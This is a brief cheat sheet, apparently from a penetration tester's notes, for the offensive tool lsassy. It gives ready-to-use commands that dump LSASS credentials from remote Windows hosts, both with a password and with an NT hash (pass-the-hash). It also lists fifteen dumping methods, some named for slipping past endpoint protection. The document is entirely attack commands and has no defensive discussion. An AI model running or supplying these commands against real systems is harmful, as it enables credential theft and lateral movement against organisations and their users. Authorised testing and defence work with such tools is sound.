### source
https://github.com/Hackndo/lsassy  

### get lsas credentials from remote host
```
lsassy -d <domain> -u <user> -p <password> <rhost>
```

### get lsas credentials from remote host using nt hash
```
lsassy -d <domain> -u <user> -H <[LM:]NT> <rhost>
```

### dump using specific method
```
lsassy -d <domain> -u <user> -p <password> <rhost> -m <method> -vv
```

### dumping methods
```
comsvcs
comsvcs_stealth
dllinject
dumpert
dumpertdll
edrsandblast
mirrordump
mirrordump_embedded
nanodump
ppldump
ppldump_embedded
procdump
procdump_embedded
rdrleakdiag
wer
```
